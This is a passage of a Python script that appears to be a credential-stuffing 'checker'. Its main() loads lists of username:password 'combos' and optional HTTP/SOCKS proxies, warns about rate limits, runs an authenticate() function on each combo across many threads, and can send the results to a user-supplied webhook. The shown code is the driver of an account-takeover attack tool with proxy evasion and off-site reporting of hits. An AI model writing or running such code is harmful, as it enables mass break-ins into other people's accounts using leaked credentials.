            print(Fore.YELLOW + f"Error sending results to webhook: {str(e)}")
    
    input()

def load_config():
    global webhook_url
    config = configparser.ConfigParser()
    config_path = "config.ini"
    if os.path.exists(config_path):
        config.read(config_path)
        if config.has_section('Webhook'):
            if config.getboolean('Webhook', 'enabled', fallback=False):
                webhook_url = config.get('Webhook', 'url', fallback=None)
                if webhook_url and not webhook_url.startswith(('http://', 'https://')):
                    print(Fore.YELLOW + "Invalid webhook URL in config.ini. Using manual input instead.")
                    webhook_url = None
    else:
        print(Fore.YELLOW + "config.ini not found. Using default settings or manual input for webhook.")

def main():
    global proxytype, webhook_url
    os.system('cls')
    print(logo)
    load_config()  # Cargar configuración al inicio
    
    try:
        threads = int(input(Fore.CYAN + "Threads (1-100, recommended 3-5): "))
        if not 1 <= threads <= 100:
            print(Fore.RED + "Threads must be between 1 and 100.")
            time.sleep(2)
            main()
        if threads > 5:
            print(Fore.YELLOW + "Warning: Using more than 5 threads may trigger rate limits (429).")
    except ValueError:
        print(Fore.RED + "Must be a number.")
        time.sleep(2)
        main()
    
    # Seleccionar tipo de proxy antes de cualquier otra operación
    print(Fore.CYAN + "Proxy Type: [1] HTTP - [2] SOCKS4 - [3] SOCKS5 - [4] None (recommended)")
    proxy_choice = input(Fore.CYAN + "Select proxy type (1-4): ")
    if proxy_choice == '1':
        proxytype = "http"
    elif proxy_choice == '2':
        proxytype = "socks4"
    elif proxy_choice == '3':
        proxytype = "socks5"
    elif proxy_choice == '4':
        proxytype = "none"
    else:
        print(Fore.RED + f"Invalid Proxy Type [{proxy_choice}]")
        time.sleep(2)
        main()
    
    # Preguntar por webhook solo si no está configurado en config.ini
    if webhook_url is None:
        webhook_choice = input(Fore.CYAN + "Do you have a webhook Y/N? ").strip().lower()
        if webhook_choice == 'y':
            webhook_url = input(Fore.CYAN + "Enter webhook link: ").strip()
            if not webhook_url.startswith(('http://', 'https://')):
                print(Fore.RED + "Invalid webhook URL. Must start with http:// or https://")
                time.sleep(2)
                main()
    
    print(Fore.CYAN + "Select your combos")
    load_accounts()
    
    if proxytype != "none":
        print(Fore.CYAN + "Select your proxies")
        load_proxies()
    
    if not os.path.exists("results"):
        os.makedirs("results")
    if not os.path.exists(f"results/{fname}"):
        os.makedirs(f"results/{fname}")
    
    threading.Thread(target=cuiscreen).start()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(authenticate, *combo.split(":")) for combo in Combos if ":" in combo]
        concurrent.futures.wait(futures)
    
    finishedscreen()

if __name__ == "__main__":
    main()
